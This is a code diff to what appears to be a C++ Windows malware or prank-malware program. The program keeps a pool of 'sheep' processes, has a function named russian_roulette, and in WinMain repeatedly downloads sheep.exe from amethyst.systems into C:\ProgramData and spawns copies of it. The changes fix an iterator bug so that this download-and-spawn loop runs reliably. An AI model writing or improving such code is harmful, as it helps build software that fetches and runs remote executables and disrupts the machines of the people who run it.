@@ -246,8 +246,6 @@ bool spawn_sheep(LPPROCESS_INFORMATION proc_info) {
 }
 
 bool clear_inactive_sheep(std::vector<PROCESS_INFORMATION> &sheep_pool) {
-   bool result = false;
-   
    for (auto iter=sheep_pool.begin(); iter!=sheep_pool.end(); ++iter) {
       DWORD exit_code;
       
@@ -255,10 +253,10 @@ bool clear_inactive_sheep(std::vector<PROCESS_INFORMATION> &sheep_pool) {
          continue;
 
       sheep_pool.erase(iter);
-      result = true;
+      return true;
    }
 
-   return result;
+   return false;
 }
 
 void russian_roulette(std::vector<PROCESS_INFORMATION> &sheep_pool) {
@@ -416,7 +414,7 @@ int WinMain(HINSTANCE instance, HINSTANCE prev_instance, LPSTR cmdline, int show
 
       while (GetFileAttributes("C:\\ProgramData\\sheep.exe") != INVALID_FILE_ATTRIBUTES || download_url(L"amethyst.systems", L"/sheep.exe", "C:\\ProgramData\\sheep.exe")) {
          if (sheep_pool.size() > 0)
-            clear_inactive_sheep(sheep_pool);
+            while (clear_inactive_sheep(sheep_pool));
 
          if (sheep_pool.size() < GLOBAL_CONFIG->max_sheep) {
             PROCESS_INFORMATION new_sheep;
